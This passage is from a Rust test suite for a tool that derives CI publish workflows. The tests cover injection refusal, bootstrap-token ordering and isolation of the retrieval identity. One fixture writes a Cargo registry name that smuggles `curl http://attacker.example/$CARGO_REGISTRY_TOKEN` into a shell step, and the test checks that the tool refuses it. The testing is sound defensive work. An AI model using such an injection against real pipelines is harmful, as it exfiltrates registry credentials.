                let workspace = if file == "component/package.json" {
                    npm_workspace("workflow-supplied-names")
                } else {
                    workspace("workflow-supplied-names")
                };
                if template == "@RELEASE_UNIT@" {
                    // The release-unit identifier is a configuration key, and
                    // it names every publication of that unit.
                    workspace.write(
                        ".intentional/config.yml",
                        &CONFIG.replace("  component:", &format!("  \"{hostile}\":")),
                    );
                } else if template == "@TOKEN_SECRET@" {
                    // A configured secret name is spliced into a
                    // `${{ secrets.NAME }}` expression, which is an identifier
                    // position: a name carrying a bracket changes what the
                    // expression evaluates rather than naming a missing secret.
                    workspace.write(
                        ".intentional/config.yml",
                        &CONFIG.replace(
                            "    cargo: {}\n",
                            &format!("    cargo: {{ token-secret: \"{hostile}\" }}\n"),
                        ),
                    );
                } else {
                    if file == ".cargo/config.toml" {
                        // An index is only read for a registry the manifest
                        // names, so the release unit has to name one.
                        workspace.write(
                            "component/Cargo.toml",
                            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"example-registry\"]\n",
                        );
                    }
                    workspace.write(file, &template.replace("@VALUE@", hostile));
                }
                let comparison = compare_workflow(workspace.root(), WorkflowRole::Publish, None);
                let Ok(comparison) = comparison else {
                    // A configuration this malformed is refused before
                    // derivation, which is the same answer earlier.
                    continue;
                };
                assert_eq!(
                    comparison.status,
                    ComparisonStatus::Blocked,
                    "{file} carrying {hostile:?} derives a workflow"
                );
                // A value that survives its own file's syntax has to be
                // refused by the name rule; one that does not is refused
                // earlier, by the parser, which is the same answer sooner.
                let codes = comparison
                    .diagnostics
                    .iter()
                    .map(|diagnostic| diagnostic.code.clone())
                    .collect::<Vec<_>>();
                assert!(
                    codes.iter().any(|reported| reported == code)
                        || codes
                            .iter()
                            .any(|reported| reported == "publication-unresolved"),
                    "{file} carrying {hostile:?} is refused as {code} or as unparsable: {codes:?}"
                );
            }
        }
    }

    // Two names reach a maintained recipe from repository content rather than
    // from this derivation: the Cargo registry `package.publish` names, and the
    // npm package name GitHub Package Registry has to resolve. The first lands
    // in `run:` bodies that hold the registry token, so a name carrying a quote
    // is not a registry that fails to resolve, it is shell source a publisher
    // job executes while holding a credential -- and the derived workflow still
    // parses as YAML, so every structural assertion in this module passes over
    // it. The second is refused because the registry will refuse it, in a job
    // that runs after the primary has already shipped.
    #[test]
    fn refuses_a_configured_name_it_would_otherwise_carry_into_a_credentialed_script() {
        let workspace = workspace("workflow-registry-injection");
        workspace.write(
            "component/Cargo.toml",
            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"alt\\\"; curl http://attacker.example/$CARGO_REGISTRY_TOKEN; #\"]\n",
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        assert_eq!(comparison.diagnostics[0].code, "recipe-underivable");
        assert!(
            comparison.diagnostics[0]
                .message
                .contains("is not a Cargo registry name"),
            "{:?}",
            comparison.diagnostics[0]
        );

        // The same refusal covers the shape that does not even parse, so the
        // cause is named rather than reported as an invalid template.
        workspace.write(
            "component/Cargo.toml",
            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"alt\\nregistry\"]\n",
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.diagnostics[0].code, "recipe-underivable");

        let workspace = npm_workspace("workflow-unscoped-github-package");
        workspace.write(
            "component/package.json",
            r#"{"name":"example-component","version":"1.0.0"}"#,
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        assert_eq!(comparison.diagnostics[0].code, "recipe-underivable");
        assert!(
            comparison.diagnostics[0]
                .message
                .contains("under the publishing account's scope"),
            "{:?}",
            comparison.diagnostics[0]
        );
    }

    // A destination the catalog names has one anonymity. A Cargo primary does
    // not: it resolves to whatever registry `package.publish` names, ordinarily
    // a private one, and the recipe authenticates it with a configured token
    // and then retrieves it with that token in the environment. Recording the
    // catalog's public default there asserts a consumer path nobody outside the
    // credential holder could take, which is the untruth the authenticated mode
    // was introduced to stop -- and the destination that most needed it was the
    // one that walked past it.
    #[test]
    fn records_an_alternate_cargo_registry_as_a_destination_without_anonymous_read() {
        let workspace = workspace("workflow-alternate-cargo-registry");
        workspace.write(
            ".cargo/config.toml",
            "[registries.example-registry]\nindex = \"sparse+https://registry.example/index/\"\n",
        );
        workspace.write(
            "component/Cargo.toml",
            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"example-registry\"]\n",
        );
        converge(workspace.root(), WorkflowRole::Publish);

        let selected = crate::executor::recipe::select_publications(
            workspace.root(),
            &Config::load(workspace.root()).expect("configuration loads"),
        )
        .expect("publications select");
        assert_eq!(
            selected[0].retrieval,
            CleanClientMode::AuthenticatedRegistry,
            "an alternate registry admits no anonymous consumer path"
        );

        let written = publisher_steps(workspace.root(), PRIMARY_TARGET)
            .iter()
            .filter_map(|step| {
                step_environment(step)
                    .get("INTENTIONAL_RETRIEVAL_MODE")
                    .cloned()
            })
            .collect::<Vec<_>>();
        assert_eq!(written, vec!["authenticated-registry".to_owned()]);

        // The name never reaches a command as spliced text, whether or not it
        // would have been safe to splice.
        for step in publisher_steps(workspace.root(), PRIMARY_TARGET) {
            let body = step.get("run").and_then(Value::as_str).unwrap_or_default();
            assert!(
                !body.contains("--registry example-registry"),
                "the configured registry name reaches cargo as a quoted variable: {body}"
            );
        }
    }

    // The mode field states what the retrieval did, so the retrieval has to be
    // what the field says. The bootstrap path writes an auth token into the
    // job's own npm configuration and it persists for the rest of the job, so a
    // retrieval reading that file sends a credential while recording a public
    // consumer path. A fresh cache is not a fresh identity. Isolation is
    // invisible in every structural property of the graph -- the step is in the
    // right job, in the right order, writing the right document -- so the
    // configuration the retrieval runs under is asserted directly, together
    // with what that configuration is made to hold.
    #[test]
    fn retrieves_under_the_identity_the_recorded_mode_names() {
        let workspace = npm_workspace("workflow-clean-client-identity");
        converge(workspace.root(), WorkflowRole::Publish);
        for (target, credentialed) in [(PRIMARY_TARGET, false), ("github", true)] {
            let readback = publisher_steps(workspace.root(), target)
                .into_iter()
                .find(|step| step_environment(step).contains_key("INTENTIONAL_OBSERVATION"))
                .expect("the recipe reads its destination back");
            let environment = step_environment(&readback);
            assert_eq!(
                environment["INTENTIONAL_RETRIEVAL_MODE"] == "authenticated-registry",
                credentialed,
                "the {target} destination records the identity it retrieves under"
            );
            let body = readback["run"].as_str().expect("a script");

            // Everything between preparing the scratch directory and the
            // retrieval is how the retrieval's identity is decided.
            let (_, prepared) = body
                .split_once("mkdir -p \"${INTENTIONAL_WORK}/clean\"")
                .expect("the step prepares a scratch directory for its retrieval");
            let (prepared, invocation) = prepared
                .split_once("npm pack")
                .expect("the recipe retrieves through the client's own path");

            assert!(
                prepared.contains("> \"${INTENTIONAL_WORK}/clean/npmrc\""),
                "the {target} step writes the configuration its retrieval reads"
            );
            assert_eq!(
                prepared.contains("_authToken"),
                credentialed,
                "the {target} scratch configuration holds a credential only where the recorded mode says one was used"
            );
            assert!(
                invocation
                    .lines()
                    .next()
                    .into_iter()
                    .chain(prepared.rsplit('\n').take(3))
                    .any(|line| line
                        .contains("npm_config_userconfig=\"${INTENTIONAL_WORK}/clean/npmrc\"")),
                "the {target} retrieval runs under that configuration rather than the job's"
            );
        }
    }

    // Cargo spells "the index does not carry this crate" and "I did not look,
    // because I was told not to go online" with the same words, so the probe
    // refuses to be offline rather than trying to tell the two apart. That
    // setting, and every other the probe runs under, now come from one place:
    // the environment is cleared and rebuilt from an allowlist, so what is
    // asserted is the contents of that list and that every client invocation
    // runs under it. A variable the list does not name cannot reach the client,
    // which is the property four rounds of key-by-key closure never had.
    #[test]
    fn resolves_under_an_allowlisted_environment_that_forces_the_network_on() {
        for (label, workspace, manifest, carries) in [
            (
                "the crates.io primary",
                workspace("workflow-cargo-online-primary"),
                "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\n",
                None,
            ),
            (
                "a configured alternate registry",
                {
                    let workspace = workspace("workflow-cargo-online-alternate");
                    workspace.write(
                        ".cargo/config.toml",
                        "[registries.example-registry]\nindex = \"sparse+https://registry.example/index/\"\n",
                    );
                    workspace
                },
                "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"example-registry\"]\n",
                Some("CARGO_REGISTRIES_EXAMPLE_REGISTRY_TOKEN"),
            ),
        ] {
            workspace.write("component/Cargo.toml", manifest);
            converge(workspace.root(), WorkflowRole::Publish);
            let bodies = publisher_steps(workspace.root(), PRIMARY_TARGET)
                .into_iter()
                .filter_map(|step| step.get("run").and_then(Value::as_str).map(str::to_owned))
                .filter(|body| body.contains("INTENTIONAL_resolve()"))
                .collect::<Vec<_>>();
            assert!(
                !bodies.is_empty(),
                "{label} resolves its destination through cargo"
            );

            // Both names cargo reads are derived from the configured registry,
            // and the ordinary spelling of a registry carries a hyphen -- which
            // is not a character a variable name may hold, so a derivation that
            // passed the name through would name something no shell can set and
            // no client reads, and the alternate-registry path would fail on a
            // runner with neither a credential nor an index.
            let declared = |key: &str| {
                publisher_steps(workspace.root(), PRIMARY_TARGET)
                    .iter()
                    .filter_map(|step| step_environment(step).get(key).cloned())
                    .collect::<BTreeSet<_>>()
            };
            assert_eq!(
                declared("INTENTIONAL_REGISTRY_INDEX_VARIABLE"),
                [carries
                    .map(|_| "CARGO_REGISTRIES_EXAMPLE_REGISTRY_INDEX".to_owned())
                    .unwrap_or_default()]
                .into_iter()
                .collect::<BTreeSet<_>>(),
                "{label} names the index variable cargo reads for it"
            );
            // The credential is named where the recorded retrieval is the
            // authenticated one and nowhere else, and it is named in `env:`
            // rather than in the script, so a case transform on the way to a
            // shell body has nothing to transform.
            assert_eq!(
                declared("INTENTIONAL_CARRIED_TOKEN"),
                [carries.map(str::to_owned).unwrap_or_default()]
                    .into_iter()
                    .collect::<BTreeSet<_>>(),
                "{label} carries only the credential its recorded retrieval uses"
            );
            for body in bodies {
                let allowlist = body
                    .split_once("INTENTIONAL_resolve()")
                    .map(|(head, _)| head)
                    .expect("the allowlist is built before the resolve uses it");
                assert!(
                    allowlist.contains("CARGO_NET_OFFLINE=false"),
                    "{label} forces the probe online: {allowlist}"
                );
                assert!(
                    allowlist.contains("${INTENTIONAL_CARRIED_TOKEN}"),
                    "{label} reads the carried credential's name rather than spelling it: {allowlist}"
                );

                // Every client invocation runs under the list. One that did not
                // would inherit the job's environment, which is where a
                // repository's own workflow-level `env:` arrives.
                let (_, resolve) = body
                    .split_once("INTENTIONAL_resolve()")
                    .expect("the resolve is a shell function");
                for command in ["cargo new", "cargo add", "cargo fetch"] {
                    let invocation = resolve
                        .split_once(command)
                        .map(|(head, _)| head)
                        .unwrap_or_else(|| panic!("{label} runs {command}"));
                    let preamble = invocation
                        .rsplit("&&")
                        .next()
                        .unwrap_or_default()
                        .to_owned();
                    assert!(
                        preamble.contains("env -i \"${INTENTIONAL_ALLOWED[@]}\""),
                        "{label} runs {command} under the allowlist: {preamble:?}"
                    );
                    assert!(
                        preamble.contains("CARGO_HOME=\"$1/home\""),
                        "{label} gives {command} a scratch CARGO_HOME: {preamble:?}"
                    );
                }
            }
        }
    }

    // The existence probe answers two questions with one call: whether the
    // destination holds the release, and what it holds. The second answer
    // becomes the destination digest the readback compares against the promoted
    // integrity, so anything else the client said on the way becomes a
    // disagreement the recipe reports as the registry publishing bytes the
    // release never sent -- a conflict observation that fails the publication
    // and accuses the wrong party. npm writes warnings and notices to standard
    // error on successful calls, so the two streams have to stay apart. This
    // runs the derived helper against a client that talks on both.
    #[test]
    fn answers_only_with_what_the_registry_answered() {
        let workspace = npm_workspace("workflow-probe-streams");
        converge(workspace.root(), WorkflowRole::Publish);
        let readback = publisher_steps(workspace.root(), PRIMARY_TARGET)
            .into_iter()
            .find(|step| step_environment(step).contains_key("INTENTIONAL_OBSERVATION"))
            .expect("the recipe reads its destination back");
        let body = readback["run"].as_str().expect("a script");
        let start = body
            .find("INTENTIONAL_npm_holds() {")
            .expect("the recipe defines an existence probe");
        let end = body[start..]
            .find("\n}\n")
            .expect("the probe is a shell function");
        let helper = &body[..start + end + "\n}\n".len()];

        let temporary = workspace.root().join("runner");
        std::fs::create_dir_all(&temporary).expect("runner directory");
        let integrity = "sha512-anintegritythepublishedreleaseactuallycarries";
        for (label, script, expected, status) in [
            (
                "a successful call that also warns",
                format!("case \"$1\" in view) echo '{integrity}' ;; esac"),
                integrity,
                0,
            ),
            (
                "a package the registry does not hold",
                "case \"$1\" in view) echo 'npm error code E404' >&2; exit 1 ;; esac".to_owned(),
                "",
                1,
            ),
            (
                "a call the registry did not answer",
                "case \"$1\" in view) echo 'npm error network request failed' >&2; exit 1 ;; esac"
                    .to_owned(),
                "",
                2,
            ),
        ] {
            let stubs = stub_client(&temporary.join(status.to_string()), "npm", &script);
            let answer = temporary.join("answer");
            let mut command = std::process::Command::new("bash");
            command
                .arg("-c")
                .arg(format!(
                    "{helper}\nINTENTIONAL_npm_holds example > \"{}\"; exit $?",
                    answer.display()
                ))
                .env(
                    "PATH",
                    format!(
                        "{}:{}",
                        stubs.display(),
                        std::env::var("PATH").unwrap_or_default()
                    ),
                )
                .env("RUNNER_TEMP", &temporary)
                .env("INTENTIONAL_REGISTRY", "https://registry.example");
            let output = command.output().expect("the probe runs");
            assert_eq!(
                output.status.code(),
                Some(status),
                "{label} classifies as {status}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
            assert_eq!(
                std::fs::read_to_string(&answer).unwrap_or_default(),
                expected,
                "{label} returns only what the registry answered"
            );
        }
    }

    // A probe that did not succeed is not evidence of absence. `npm view` and
    // `cargo add` fail the same way on a missing package, a rate limit, a proxy
    // failure and a 5xx, and absence is the one condition that unlocks the
    // long-lived bootstrap token. Collapsing the two turns any transient
    // registry failure into a steady-state publication authenticated by a
    // long-lived credential instead of the configured trusted identity -- the
    // silent fallback the design forbids, arrived at without anything saying
    // so. The ordering assertion below cannot see this, because it asserts
    // where the token is read and not what the probe proved, so the script is
    // run against a client that gives each answer.
    #[test]
    fn refuses_a_bootstrap_token_when_the_probe_did_not_answer() {
        let inconclusive = "npm error network request to https://registry.example failed";
        for (workspace, client, absent, inconclusive, present) in [
            (
                workspace("workflow-probe-cargo"),
                "cargo",
                CARGO_NEW.to_owned()
                    + "case \"$1\" in add) echo 'error: the crate could not be found in registry index' >&2; exit 1 ;; esac",
                CARGO_NEW.to_owned()
                    + "case \"$1\" in add) echo 'error: failed to fetch; connection reset' >&2; exit 1 ;; esac",
                String::new(),
            ),
            (
                npm_workspace("workflow-probe-npm"),
                "npm",
                "case \"$1\" in view) echo 'npm error code E404' >&2; exit 1 ;; esac".to_owned(),
                format!("case \"$1\" in view) echo '{inconclusive}' >&2; exit 1 ;; esac"),
                "case \"$1\" in view) echo 'sha512-abc' ;; esac".to_owned(),
            ),
        ] {
            converge(workspace.root(), WorkflowRole::Publish);
            let authenticate = publisher_steps(workspace.root(), PRIMARY_TARGET)
                .into_iter()
                .find(|step| {
                    step_environment(step).contains_key("INTENTIONAL_BOOTSTRAP_TOKEN")
                })
                .expect("the primary publisher authenticates");
            let temporary = workspace.root().join("runner");
            std::fs::create_dir_all(&temporary).expect("runner directory");
            let token = [("INTENTIONAL_BOOTSTRAP_TOKEN", "a-long-lived-token")];

            let stubs = stub_client(&temporary.join("absent"), client, &absent);
            let (succeeded, log) = run_step(&authenticate, &stubs, &temporary, &token);
            assert!(
                succeeded,
                "a proven first publication reaches its bootstrap token"
            );
            assert!(
                log.contains("a-long-lived-token")
                    || std::fs::read_to_string(temporary.join("github.env"))
                        .unwrap_or_default()
                        .contains("a-long-lived-token"),
                "the bootstrap path presents the token: {log}"
            );

            let stubs = stub_client(&temporary.join("inconclusive"), client, &inconclusive);
            std::fs::write(temporary.join("github.env"), "").expect("reset");
            let (succeeded, log) = run_step(&authenticate, &stubs, &temporary, &token);
            assert!(
                !succeeded,
                "a probe that did not answer refuses to decide: {log}"
            );
            assert!(
                !log.contains("a-long-lived-token")
                    && !std::fs::read_to_string(temporary.join("github.env"))
                        .unwrap_or_default()
                        .contains("a-long-lived-token"),
                "an inconclusive probe never presents the bootstrap token: {log}"
            );

            if present.is_empty() {
                continue;
            }
            let stubs = stub_client(&temporary.join("present"), client, &present);
            std::fs::write(temporary.join("github.env"), "").expect("reset");
            let (succeeded, log) = run_step(&authenticate, &stubs, &temporary, &token);
            assert!(succeeded, "an existing package authenticates: {log}");
            assert!(
                !log.contains("a-long-lived-token"),
                "steady-state publication never presents the bootstrap token: {log}"
            );
        }
    }

    // The bootstrap token exists because a registry cannot bind a trusted
    // publisher to a package it does not hold yet. That is its whole warrant,
    // and it holds only while the package is absent: a recipe that read the
    // secret first and probed afterwards would have a long-lived credential in
    // hand on every steady-state publication, which is the fallback the design
    // forbids. Ordering inside one script is the only place that can be seen,
    // so it is asserted by relative position rather than by presence.
    #[test]
    fn reaches_a_bootstrap_token_only_after_proving_the_package_is_absent() {
        for (workspace, secret) in [
            (
                workspace("workflow-bootstrap-cargo"),
                "secrets.CARGO_REGISTRY_TOKEN",
            ),
            (npm_workspace("workflow-bootstrap-npm"), "secrets.NPM_TOKEN"),
        ] {
            converge(workspace.root(), WorkflowRole::Publish);
            let steps = publisher_steps(workspace.root(), "primary");
            let holders = steps
                .iter()
                .filter(|step| {
                    step_environment(step)
                        .values()
                        .any(|value| value.contains(secret))
                })
                .collect::<Vec<_>>();
            let [authenticate] = holders.as_slice() else {
                panic!("exactly one step of the primary publisher reads {secret}");
            };
            let body = authenticate["run"].as_str().expect("a script");
            let probe = body
                .find("INTENTIONAL_SUBJECT_IDENTITY")
                .expect("the script resolves the package before deciding");
            let read = body
                .find("${INTENTIONAL_BOOTSTRAP_TOKEN:-}")
                .expect("the script reads the bootstrap token defensively");
            assert!(
                probe < read,
                "the primary publisher probes for the package before reaching its bootstrap token"
            );
        }
    }

    // The recipe fixes what its destination admits, and the observation it
    // writes has to say the same thing or `verify publication` refuses it. Both
    // sides are derived here, so a destination whose recipe changed one and not
    // the other fails at derivation instead of on a release runner.
    #[test]
    fn writes_the_retrieval_mode_the_maintained_recipe_fixes() {
        let workspace = npm_workspace("workflow-retrieval-mode");
        converge(workspace.root(), WorkflowRole::Publish);
        for (target, mode) in [
            (PRIMARY_TARGET, CleanClientMode::Public),
            ("github", CleanClientMode::AuthenticatedRegistry),
        ] {
            let selected = crate::executor::recipe::select_publications(
                workspace.root(),
                &Config::load(workspace.root()).expect("configuration loads"),
            )
            .expect("publications select")
            .into_iter()
            .find(|publication| publication.target == target)
            .expect("the target is configured");
            assert_eq!(selected.retrieval, mode, "the catalog fixes {target}");

            let written = publisher_steps(workspace.root(), target)
                .iter()
                .filter_map(|step| {
                    step_environment(step)
                        .get("INTENTIONAL_RETRIEVAL_MODE")
                        .cloned()
                })
                .collect::<Vec<_>>();
            let expected = match mode {
                CleanClientMode::Public => "public",
                CleanClientMode::AuthenticatedRegistry => "authenticated-registry",
                CleanClientMode::AuthenticatedDraft => "authenticated-draft",
            };
            assert_eq!(
                written,
                vec![expected.to_owned()],
                "the {target} recipe records the retrieval its catalog entry fixes"
            );
        }
    }

    // The recipe waits for its own destination and the command that reads its
    // observation waits under the same bound. Two hand-written copies of that
    // policy drift silently: a recipe that gave up sooner would report pending
    // for a release that was about to appear, and one that outlasted the
    // command would keep a runner busy past the point anything could accept it.
    #[test]
    fn waits_under_the_bound_the_maintained_policy_states() {
        let workspace = workspace("workflow-consistency-policy");
        converge(workspace.root(), WorkflowRole::Publish);
        let policy =
            crate::publication::observation::ConsistencyPolicy::maintained(PublisherKind::Cargo);
        let readback = publisher_steps(workspace.root(), "primary")
            .into_iter()
            .find(|step| step_environment(step).contains_key("INTENTIONAL_DEADLINE"))
            .expect("the recipe reads its destination back under a bound");
        let environment = step_environment(&readback);
        for (variable, seconds) in [
            ("INTENTIONAL_INTERVAL", policy.interval.as_secs()),
            (
                "INTENTIONAL_MAXIMUM_INTERVAL",
                policy.maximum_interval.as_secs(),
            ),
            ("INTENTIONAL_DEADLINE", policy.deadline.as_secs()),
        ] {
            assert_eq!(
                environment.get(variable).map(String::as_str),
                Some(seconds.to_string().as_str()),
                "{variable} is the maintained policy's value"
            );
        }
        assert_eq!(
            environment.get("INTENTIONAL_BACKOFF").map(String::as_str),
            Some(policy.backoff.to_string().as_str())
        );
    }

    // A workflow identity is a credential every step of the job it is granted
    // in can reach. Granting it to a destination whose recipe never presents
    // one costs nothing visible and is therefore exactly the kind of scope that
    // accumulates, so the jobs that hold it are named.
    #[test]
    fn grants_a_workflow_identity_only_where_a_recipe_presents_one() {
        let workspace = npm_workspace("workflow-identity-scope");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        for (target, granted) in [("primary", true), ("github", false)] {
            let id = job_ids(&jobs, "intentional_publish_")
                .into_iter()
                .find(|id| id.ends_with(target))
                .expect("the publisher job is derived");
            let permissions = jobs[&Value::String(id.clone())]["permissions"]
                .as_mapping()
                .expect("a publisher states its permissions");
            assert_eq!(
                permissions.contains_key(Value::String("id-token".to_owned())),
                granted,
                "{id} holds a workflow identity only if its recipe presents one"
            );
        }
    }

    #[test]
    fn refuses_to_compare_an_unbounded_workflow() {
        let workspace = workspace("workflow-too-large");
        let padding = (0..=MAX_WORKFLOW_LINES)
            .map(|line| format!("# padding {line}\n"))
            .collect::<String>();
        workspace.write(
            "oversized.yml",
            &format!("{padding}{REPOSITORY_RELEASE_WORKFLOW}"),
        );
        let comparison = compare_workflow(
            workspace.root(),
            WorkflowRole::Release,
            Some(Path::new("oversized.yml")),
        )
        .expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        assert_eq!(comparison.diagnostics[0].code, "workflow-too-large");
    }

    #[test]
    fn compares_an_explicit_workflow_override() {
        let workspace = workspace("workflow-override");
        workspace.write("candidate.yml", REPOSITORY_RELEASE_WORKFLOW);
        let comparison = compare_workflow(
            workspace.root(),
            WorkflowRole::Release,
            Some(Path::new("candidate.yml")),
        )
        .expect("comparison");
        assert_eq!(comparison.path, PathBuf::from("candidate.yml"));
        assert!(
            comparison.patch.contains("--- a/candidate.yml"),
            "{}",
            comparison.patch
        );
    }

    #[test]
    fn structured_result_matches_the_published_workflow_diff_schema() {
        let workspace = workspace("workflow-json");
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        let json: serde_json::Value =
            serde_json::from_str(&comparison.to_json().expect("json")).expect("json parses");
        assert_eq!(json["$schema"], WORKFLOW_DIFF_SCHEMA);
        assert_eq!(json["contract"], WORKFLOW_CONTRACT);
        assert_eq!(json["workflow"]["kind"], "release");
        assert_eq!(json["status"], "different");
        assert_eq!(json["changed"], true);
        assert_eq!(json["applied"], false);
        assert!(json["input-digest"]
            .as_str()
            .expect("digest")
            .starts_with("sha256:"));
        assert_eq!(
            json["diagnostics"].as_array().expect("diagnostics").len(),
            0
        );

        let blocked = compare_workflow(
            workspace.root(),
            WorkflowRole::Release,
            Some(Path::new("absent.yml")),
        )
        .expect("comparison");
        let json: serde_json::Value =
            serde_json::from_str(&blocked.to_json().expect("json")).expect("json parses");
        assert_eq!(json["status"], "blocked");
        assert!(
            json.get("patch").is_none(),
            "a blocked result carries no output claim"
        );
        assert_eq!(json["diagnostics"][0]["code"], "workflow-missing");
    }

    #[test]
    fn published_workflow_diff_schema_declares_every_emitted_field() {
        let schema: Value =
            serde_yaml::from_str(include_str!("../../../../schemas/workflow-diff.yml"))
                .expect("workflow diff schema parses");
        assert_eq!(
            schema["properties"]["$schema"]["const"].as_str(),
            Some(WORKFLOW_DIFF_SCHEMA)
        );
        assert_eq!(
            schema["properties"]["contract"]["const"].as_str(),
            Some(WORKFLOW_CONTRACT)
        );

        let workspace = workspace("workflow-schema-fields");
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        let emitted: serde_json::Value =
            serde_json::from_str(&comparison.to_json().expect("json")).expect("json parses");
        let declared = schema["properties"]
            .as_mapping()
            .expect("declared properties")
            .keys()
            .filter_map(Value::as_str)
            .map(str::to_owned)
            .collect::<BTreeSet<_>>();
        for key in emitted.as_object().expect("result object").keys() {
            assert!(declared.contains(key.as_str()), "{key} is declared");
        }
        for key in schema["required"].as_sequence().expect("required fields") {
            let key = key.as_str().expect("required field name");
            assert!(emitted.get(key).is_some(), "{key} is emitted");
        }
    }

    /// The maintained GoReleaser recipes, executed against stubbed remotes.
    ///
    /// A promotion body is shell, and what this task is accountable for -- the
    /// files that land at the destination, under the names the destination
    /// requires, from the layout the packager actually writes -- is a property
    /// of what that shell does rather than of what it says. Asserting the
    /// emitted text restates the recipe; it cannot notice that the packager
    /// writes `aur/<name>.pkgbuild` where the recipe looked for `PKGBUILD`.
    ///
    /// So each scenario runs the derived body over a fixture shaped like the
    /// packager's real distribution tree, with the remote-reaching commands
    /// replaced by stubs, and reads back what arrived at the destination.
    /// `git` is not stubbed away: the stub only rewrites the destination URL to
    /// a local bare repository and hands the invocation to the real client, so
    /// clone, add, status, commit, and push keep their own semantics.
    pub(super) mod goreleaser_recipes {
        use super::*;
        use crate::executor::fixture::Workspace;
        use std::path::PathBuf;

        const HOMEBREW_JOB: &str = "intentional_publish_component_homebrew_primary";
        const AUR_JOB: &str = "intentional_publish_component_aur_primary";
        /// Package identity the Arch destination resolves, from native evidence.
        const AUR_PACKAGE: &str = "example-tool-bin";

        /// Native configuration declaring two taps and two Arch packages.
        ///
        /// One `brews` entry keeps the packager's default directory and the
        /// other declares its own, because the recipe's claim is that the
        /// native member decides where a formula lands. The second `aur` entry
        /// exists to be left alone: its files share one directory with this
        /// publication's, and promoting them would publish another package's
        /// sources under this package's name.
        ///
        /// The `aur` names are declared the way a repository declares them,
        /// without the suffix the packager adds. Pre-normalising them here
        /// would make the identity the derivation produces and the file the
        /// packager writes agree by construction, and no scenario could then
        /// observe them disagreeing -- which is the shape a real defect took.
        const NATIVE_CONFIG: &str = r#"version: 2
project_name: example-tool
builds:
  - main: ./cmd/example-tool
brews:
  - repository: { owner: example-org, name: homebrew-tap }
  - repository: { owner: example-org, name: homebrew-tap }
    directory: HomebrewFormula
nfpms:
  - formats: [ rpm, deb ]
aur:
  - name: example-tool
  - name: example-other
"#;

        /// The same release unit, with its first Arch entry unnamed.
        ///
        /// The packager resolves an unnamed entry to the project name, so this
        /// declares the same destination a different way, and it is the shape
        /// in which a dropped entry would silently promote the sibling.
        const UNNAMED_ARCH_CONFIG: &str = r#"version: 2
project_name: example-tool
builds:
  - main: ./cmd/example-tool
aur:
  - {}
  - name: example-other
"#;

        /// One derived promotion body and the destinations it can reach.
        struct Recipe {
            workspace: Workspace,
            remotes: PathBuf,
            stubs: PathBuf,
            temp: PathBuf,
            job: String,
        }

        /// What running one promotion body produced.
        struct Outcome {
            status: std::process::ExitStatus,
            stderr: String,
        }

        impl Outcome {
            fn succeeded(&self) -> bool {
                self.status.success()
            }

            fn expect_success(&self) -> &Self {
                assert!(
                    self.succeeded(),
                    "the promotion body succeeds: {}",
                    self.stderr
                );
                self
            }
        }

        impl Recipe {
            fn new(label: &str, job: &str) -> Self {
                Self::declaring(label, job, NATIVE_CONFIG)
            }

            fn declaring(label: &str, job: &str, native: &str) -> Self {
                let workspace = go_workspace(label);
                workspace.write("component/.goreleaser.yaml", native);
                converge(workspace.root(), WorkflowRole::Publish);
                let root = workspace.root().to_path_buf();
                let remotes = root.join("remotes");
                let stubs = root.join("stubs");
                std::fs::create_dir_all(&remotes).expect("remote directory");
                std::fs::create_dir_all(&stubs).expect("stub directory");
                write_stubs(&stubs);
                Self {
                    temp: root.join("runner-temp"),
                    workspace,
                    remotes,
                    stubs,
                    job: job.to_owned(),
                }
            }

            /// Create the destination repository this publication pushes into.
            fn with_destination(self, name: &str) -> Self {
                let path = self.remotes.join(name);
                let status = std::process::Command::new("git")
                    .args(["init", "--quiet", "--bare", "--initial-branch=master"])
                    .arg(&path)
                    .status()
                    .expect("git init runs");
                assert!(status.success(), "the destination repository exists");
                self
            }

            /// Write the distribution tree the build job would have produced.
            ///
            /// The layout below is GoReleaser's own, at the release
            /// [`GORELEASER_VERSION`] pins: `homebrew/<directory>/<name>.rb` and
            /// `aur/<package>.pkgbuild`. Every promotion these scenarios execute
            /// reads those paths, so raising that pin is a change to what this
            /// fixture asserts and both move together or the scenarios go on
            /// passing against a layout the packager no longer writes.
            fn with_distribution(self) -> Self {
                let bytes = self.temp.join("intentional_subject/bytes");
                for (relative, contents) in [
                    (
                        "homebrew/Formula/example-tool.rb",
                        "class ExampleTool < Formula\nend\n",
                    ),
                    (
                        "homebrew/HomebrewFormula/example-tool.rb",
                        "class ExampleTool < Formula\nend\n",
                    ),
                    // A cask is generated Ruby that is not a formula, and it
                    // sorts before the formulas the tap expects.
                    (
                        "homebrew_casks/example-tool.rb",
                        "cask 'example-tool' do\nend\n",
                    ),
                    (
                        "aur/example-tool-bin.pkgbuild",
                        "pkgname=example-tool-bin\n",
                    ),
                    (
                        "aur/example-tool-bin.srcinfo",
                        "pkgbase = example-tool-bin\n",
                    ),
                    (
                        "aur/example-other-bin.pkgbuild",
                        "pkgname=example-other-bin\n",
                    ),
                    (
                        "aur/example-other-bin.srcinfo",
                        "pkgbase = example-other-bin\n",
                    ),
                    ("example-tool_1.0.0_amd64.deb", "the deb the release built"),
                ] {
                    let path = bytes.join(relative);
                    std::fs::create_dir_all(path.parent().expect("parent"))
                        .expect("dist directory");
                    std::fs::write(path, contents).expect("dist file");
                }
                self
            }

            /// Run the derived promotion body, optionally with a drifted host key.
            fn run(&self) -> Outcome {
                self.run_with_host_fingerprint(None)
            }

